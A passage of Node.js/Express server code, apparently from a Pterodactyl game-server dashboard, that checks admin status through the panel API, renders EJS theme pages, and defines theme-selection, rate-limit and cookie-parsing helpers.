        {
          method: "get",
          headers: { 'Content-Type': 'application/json', "Authorization": `Bearer ${settings.pterodactyl.key}` }
        }
      );
      if (await cacheaccount.statusText == "Not Found") {
        if (err) {
          console.log(chalk.red(`[WEBSITE] An error has occured on path ${req._parsedUrl.pathname}:`));
          console.log(err);
          return res.send("An error has occured while attempting to load this page. Please contact an administrator to fix this.");
        };
        return res.send(str);
      };
      let cacheaccountinfo = JSON.parse(await cacheaccount.text());
    
      req.session.pterodactyl = cacheaccountinfo.attributes;
      if (cacheaccountinfo.attributes.root_admin !== true) {
        if (err) {
          console.log(chalk.red(`[WEBSITE] An error has occured on path ${req._parsedUrl.pathname}:`));
          console.log(err);
          return res.send("An error has occured while attempting to load this page. Please contact an administrator to fix this.");
        };
        return res.send(str);
      };

      ejs.renderFile(
        `./themes/${theme.name}/${theme.settings.pages[req._parsedUrl.pathname.slice(1)] ? theme.settings.pages[req._parsedUrl.pathname.slice(1)] : theme.settings.notfound}`, 
        await eval(indexjs.renderdataeval),
        null,
      function (err, str) {
        delete req.session.newaccount;
        delete req.session.password;
        if (err) {
          console.log(`[WEBSITE] An error has occured on path ${req._parsedUrl.pathname}:`);
          console.log(err);
          return res.send("An error has occured while attempting to load this page. Please contact an administrator to fix this.");
        };
        res.status(404);
        res.send(str);
      });
    });
    return;
  };
  ejs.renderFile(
    `./themes/${theme.name}/${theme.settings.pages[req._parsedUrl.pathname.slice(1)] ? theme.settings.pages[req._parsedUrl.pathname.slice(1)] : theme.settings.notfound}`, 
    await eval(indexjs.renderdataeval),
    null,
  function (err, str) {
    delete req.session.newaccount;
    delete req.session.password;
    if (err) {
      console.log(chalk.red(`[WEBSITE] An error has occured on path ${req._parsedUrl.pathname}:`));
      console.log(err);
      return res.send("An error has occured while attempting to load this page. Please contact an administrator to fix this.");
    };
    res.status(404);
    res.send(str);
  });
});

module.exports.get = function(req) {
  let defaulttheme = JSON.parse(fs.readFileSync("./settings.json")).defaulttheme;
  let tname = encodeURIComponent(getCookie(req, "theme"));
  let name = (
    tname ?
      fs.existsSync(`./themes/${tname}`) ?
        tname
      : defaulttheme
    : defaulttheme
  )
  return {
    settings: (
      fs.existsSync(`./themes/${name}/pages.json`) ?
        JSON.parse(fs.readFileSync(`./themes/${name}/pages.json`).toString())
      : defaultthemesettings
    ),
    name: name
  };
};

module.exports.islimited = async function() {
  return cache == true ? false : true;
}

module.exports.ratelimits = async function(length) {
  if (cache == true) return setTimeout(
    indexjs.ratelimits
    , 1
  );
  cache = true;
  setTimeout(
    async function() {
      cache = false;
    }, length * 1000
  )
}

// Get a cookie.
function getCookie(req, cname) {
  let cookies = req.headers.cookie;
  if (!cookies) return null;
  let name = cname + "=";
  let ca = cookies.split(';');
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return decodeURIComponent(c.substring(name.length, c.length));
    }
  }
  return "";
}
